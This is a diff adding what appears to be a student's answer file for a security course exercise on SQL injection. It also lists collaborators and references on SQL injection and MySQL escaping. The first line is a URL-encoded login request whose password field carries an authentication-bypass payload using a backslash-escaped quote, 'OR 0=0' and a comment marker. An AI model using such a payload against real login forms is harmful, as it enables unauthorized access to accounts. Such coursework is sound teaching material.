@@ -1,0 +1,8 @@
+username=victim&password=chris%5C%27%20OR%200%3D0%20--%20
+
+List of people I discussed the project with: Yuchan Kim, Seungwon Burm, Jeetkumar Vijariwalgi, Eric Yi
+
+List of references used:
+1. http://www.unixwiz.net/techtips/sql-injection.html (Lecture 2: SQL injection blog post from Piazza under Lectures)
+2. https://www.w3schools.com/mysql/mysql_comments.asp (MySQL comments)
+3. https://dev.mysql.com/doc/refman/8.0/en/string-literals.html (MySQL escape character)
